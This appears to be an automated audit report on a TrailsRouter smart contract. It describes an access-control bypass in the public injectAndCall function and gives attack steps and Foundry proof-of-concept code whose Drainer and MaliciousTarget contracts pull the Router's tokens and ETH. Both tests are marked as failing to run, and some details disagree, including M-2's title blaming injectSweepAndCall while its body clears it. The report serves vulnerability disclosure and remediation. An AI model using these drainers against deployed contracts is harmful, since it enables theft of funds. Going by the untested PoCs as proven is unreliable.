# 2025 11 sequence - Findings Report
## Commit hash: 593987c2b569f3212d2cadb31fc8d14b84bc30a9

##Findings by Pattern
with gpt-5-mini


 **Derived From** : AccessControlOrAuthByPass

[H-1]. injectAndCall is public (not delegate-only) — attacker can call it on Router and cause Router to approve/forward router-held tokens to arbitrary targets
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless
[M-2]. Public injectAndCall/injectSweepAndCall allow arbitrary external calls & approvals on Router (delegate-only helpers callable directly)
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 1
- M: 1
- L: 0
- I: 0

##Findings by Pattern


 **Derived From** : AccessControlOrAuthByPass

## [H-1]. injectAndCall is public (not delegate-only) — attacker can call it on Router and cause Router to approve/forward router-held tokens to arbitrary targets

### Finding Severity Justification: injectAndCall is publicly callable without onlyDelegatecall and operates on address(this) balances. When called directly on the deployed Router, it reads the Router’s own token/ETH balances, force-approves an arbitrary target for the full ERC-20 balance, or forwards all native ETH to the target. A malicious target can pull all approved tokens via transferFrom or receive all ETH, enabling theft of any Router-held assets. This is direct asset loss with a clear, realistic attack path, as Router can hold balances due to other public flows (e.g., pullAmountAndExecute, injectSweepAndCall) or leftover dust.
## Derived From Pattern/Invariant
AccessControlOrAuthByPass

## Exploit Type
AuthByPass

## Location
TrailsRouter.injectAndCall / _injectAndExecuteCall

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
TrailsRouter.injectAndCall is declared public and does not enforce onlyDelegatecall. This function is intended to be executed via delegatecall from a Sequence wallet (so _getSelfBalance reads wallet balance). Because it is public, any EOA can call injectAndCall directly on the deployed Router implementation contract (not via the Shim). In that context _getSelfBalance reads the Router contract's own balances. The function will then call SafeERC20.forceApprove(erc20, target, callerBalance) and then perform target.call(callData). A malicious target contract can be crafted to immediately call transferFrom(router, attacker, amount) (or any privileged logic), draining tokens from the Router contract if the Router holds any ERC20 balance. This allows theft of router-held ERC20 tokens and possibly ETH (via target.callable code).

## Impact
Anyone can call injectAndCall on the Router to (a) force-approve an arbitrary target for the Router’s full ERC-20 balance and let that target pull tokens via transferFrom, and/or (b) forward the Router’s entire native ETH balance to the target in the same call. This results in direct theft of any ERC-20 or ETH held by the Router. Moreover, because pullAmountAndExecute temporarily transfers user funds into the Router before downstream calls, a malicious callee in the validated Multicall path can reenter during the same transaction and invoke injectAndCall to drain those freshly pulled funds. The issue is therefore exploitable even without leftover dust, enabling immediate theft during normal execution.

## Command to Run Test


## Proof of Concept
1) Deploy a standard ERC20 token and transfer some tokens to the deployed Router contract address.
2) Deploy a malicious contract 'Drainer' with a function that calls IERC20(token).transferFrom(routerAddress, attacker, amount).
3) Attacker calls Router.injectAndCall(token, drainerAddress, abi.encodeWithSelector(drainer.drain.selector, token, amount), 0, bytes32(0)) on the Router contract directly.
4) Router will call SafeERC20.forceApprove(token, drainer, callerBalance) and then call drainer.drain(...). The Drainer contract executes transferFrom(router, attacker, amount) and succeeds, draining tokens from Router.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "./../src/TrailsRouter.sol";

interface IERC20Simple { function transfer(address,uint256) external returns(bool); function transferFrom(address,address,uint256) external returns(bool); function approve(address,uint256) external returns(bool); function balanceOf(address) external view returns(uint256); function _mint(address,uint256) external; }

contract SimpleToken is IERC20Simple {
    string public name = "Simple"; mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance;
    function _mint(address to, uint256 amt) external { balanceOf[to]+=amt; }
    function transfer(address to, uint256 amt) external returns(bool){ require(balanceOf[msg.sender]>=amt); balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; return true; }
    function approve(address s, uint256 a) external returns(bool){ allowance[msg.sender][s]=a; return true; }
    function transferFrom(address f, address t, uint256 a) external returns(bool){ require(allowance[f][msg.sender]>=a); allowance[f][msg.sender]-=a; require(balanceOf[f]>=a); balanceOf[f]-=a; balanceOf[t]+=a; return true; }
}

contract Drainer {
    // attacker will instruct this contract (as target) to pull tokens from router once approved
    function drain(address token, address from, address to, uint256 amount) external {
        // use transferFrom to pull from 'from' (expected to be router contract)
        IERC20Simple(token).transferFrom(from, to, amount);
    }
}

contract InjectAuthBypassTest is Test {
    TrailsRouter router;
    SimpleToken token;
    Drainer drainer;
    address attacker = address(0xAAA);

    function setUp() public {
        router = new TrailsRouter();
        token = new SimpleToken();
        drainer = new Drainer();
        // mint tokens to router contract directly
        token._mint(address(router), 1000 ether);
    }

    function test_attacker_can_drain_router_via_public_injectAndCall() public {
        // craft calldata for drainer.drain(token, router, attacker, amount)
        bytes memory callData = abi.encodeWithSelector(bytes4(keccak256("drain(address,address,address,uint256)")), address(token), address(router), attacker, 1000 ether);

        // attacker calls injectAndCall on the router contract directly (not delegatecall)
        vm.prank(attacker);
        router.injectAndCall(address(token), address(drainer), callData, 0, bytes32(0));

        // after call, attacker should have received tokens drained from router
        uint256 attackerBal = token.balanceOf(attacker);
        assertEq(attackerBal, 1000 ether);
        uint256 routerBal = token.balanceOf(address(router));
        assertEq(routerBal, 0);
    }
}


## Suggested Mitigation
Require injectAndCall to be callable only via delegatecall (add onlyDelegatecall or remove the public entry and route all usage through handleSequenceDelegateCall -> _injectAndCallDelegated). This ensures balances operated on are those of the calling wallet, not the Router implementation. Additionally, in the ERC-20 path of _injectAndExecuteCall, minimize approval risk by approving only the exact required amount (not full balance) and resetting approval to 0 after the external call. If exact amount is known via the placeholder replacement, use that value for approval; otherwise, refactor to avoid approvals entirely or strictly control trusted targets.


## [M-2]. Public injectAndCall/injectSweepAndCall allow arbitrary external calls & approvals on Router (delegate-only helpers callable directly)

### Finding Severity Justification: injectAndCall is publicly callable and not restricted by onlyDelegatecall, yet it operates on the Router contract’s own balances by approving an arbitrary target and then invoking it. Anyone can drain any ERC-20 or ETH balance held by the Router (e.g., leftovers from pullAmountAndExecute with excess msg.value, partial-consumption in injectSweepAndCall, or mistaken transfers). Impact is real asset loss but requires Router to hold funds, which is not the nominal design path; hence Medium rather than High.
## Derived From Pattern/Invariant
AccessControlOrAuthByPass

## Exploit Type
AccessControl

## Location
TrailsRouter.injectAndCall / injectSweepAndCall

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
injectAndCall and injectSweepAndCall are exposed as public/external functions on the Router implementation and are not protected by onlyDelegatecall. These helpers are intended to be used only via delegatecall from a Sequence wallet, but because they are publicly callable on the implementation contract, an attacker can call them directly to operate on the Router contract's own balances.

In particular, injectAndCall does:
- callerBalance = _getSelfBalance(token) // reads Router's own balance
- SafeERC20.forceApprove(erc20, target, callerBalance)
- target.call(callData)

An attacker can:
1) Ensure the Router contract holds ERC20 tokens (e.g., by transferring tokens into the Router address),
2) Call injectAndCall(token, maliciousTarget, abi.encodeWithSignature("steal(address,address)", token, attacker), 0, bytes32(0)).
The Router will approve the maliciousTarget to spend the Router's tokens, then call the target. The target, executing as called by the Router (msg.sender == Router), can then call token.transferFrom(msg.sender, attacker, amount) to pull the Router's tokens.

Vulnerable snippet: function injectAndCall(...) public payable { uint256 callerBalance = _getSelfBalance(token); _injectAndExecuteCall(...); } and _injectAndExecuteCall uses SafeERC20.forceApprove and target.call.


## Impact
Anyone can call injectAndCall directly on the Router implementation to operate on the Router’s own balances. For ERC20 tokens, the function force-approves an arbitrary target for the Router’s full token balance and then calls that target, enabling it to transferFrom the Router to the attacker up to the entire balance. For native ETH, injectAndCall forwards the Router’s entire ETH balance to the target in a single call. This results in direct loss of any tokens/ETH held by the Router (leftovers, mistaken transfers, or temporarily held balances). Note: injectSweepAndCall is intended for non-delegate usage and only approves up to the amount it just pulled from msg.sender, so it cannot drain pre-existing Router-held tokens.

## Command to Run Test


## Proof of Concept
ERC20 drain:
1) Ensure the Router holds ERC20 tokens (e.g., transfer tokens directly to the Router address).
2) Deploy a malicious target contract with function steal(address token, address to) that calls IERC20(token).transferFrom(msg.sender, to, IERC20(token).balanceOf(msg.sender)).
3) Call Router.injectAndCall(token, maliciousTarget, abi.encodeWithSignature("steal(address,address)", token, attacker), 0, bytes32(0)).
4) injectAndCall reads the Router’s token balance, force-approves the malicious target for that full amount, and calls it. The target then pulls all Router-held tokens via transferFrom.

ETH drain:
1) Fund the Router with ETH (the Router has a receive() payable).
2) Call Router.injectAndCall(address(0), recipientOrPayableTarget, "", 0, bytes32(0)).
3) injectAndCall forwards the Router’s entire ETH balance to the target, draining all ETH.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "src/TrailsRouter.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {
        _mint(msg.sender, 1_000_000 ether);
    }
    function mint(address to, uint256 v) external { _mint(to, v); }
}

contract MaliciousTarget {
    // Pull entire balance of `token` from the caller (the caller will be the router)
    function steal(address token, address to) external {
        uint256 bal = IERC20(token).balanceOf(msg.sender);
        IERC20(token).transferFrom(msg.sender, to, bal);
    }
}

contract EthSink {
    event Received(uint256 amount);
    receive() external payable { emit Received(msg.value); }
    fallback() external payable { emit Received(msg.value); }
}

contract InjectAndCallExploitTest is Test {
    TrailsRouter router;
    MockERC20 token;
    MaliciousTarget target;
    EthSink sink;
    address attacker = address(0xBADD);

    function setUp() public {
        router = new TrailsRouter();
        token = new MockERC20("Mock", "MCK");
        target = new MaliciousTarget();
        sink = new EthSink();

        // Seed router with ERC20 tokens to simulate unintended/leftover funds
        token.transfer(address(router), 1_000 ether);
        assertEq(token.balanceOf(address(router)), 1_000 ether);
    }

    function test_injectAndCall_canDrainRouterTokens() public {
        // Attacker triggers public injectAndCall
        vm.prank(attacker);
        bytes memory callData = abi.encodeWithSignature(
            "steal(address,address)", address(token), attacker
        );
        router.injectAndCall(address(token), address(target), callData, 0, bytes32(0));

        assertEq(token.balanceOf(attacker), 1_000 ether);
        assertEq(token.balanceOf(address(router)), 0);
    }

    function test_injectAndCall_canDrainRouterEth() public {
        // Fund the router with ETH
        vm.deal(address(router), 1 ether);
        assertEq(address(router).balance, 1 ether);

        // Attacker drains all ETH to a payable sink
        vm.prank(attacker);
        router.injectAndCall(address(0), address(sink), "", 0, bytes32(0));

        assertEq(address(router).balance, 0);
        assertEq(address(sink).balance, 1 ether);
    }
}


## Suggested Mitigation
- Restrict injectAndCall to delegatecall-only by adding the onlyDelegatecall modifier, or make it internal and route usage via the existing _injectAndCallDelegated path invoked by handleSequenceDelegateCall. This preserves intended delegated usage while preventing direct calls on the Router implementation.
- Do not restrict injectSweepAndCall (it is intended for non-delegate usage), but as defense-in-depth, consider resetting ERC20 allowance to zero after the target call to avoid lingering approvals if the target does not consume the full amount.
- Optionally, for ERC20 flows, set allowance precisely for the amount to be spent and clear it post-call; for native ETH, consider requiring an explicit value field in callData or a whitelist for targets if appropriate for your threat model.



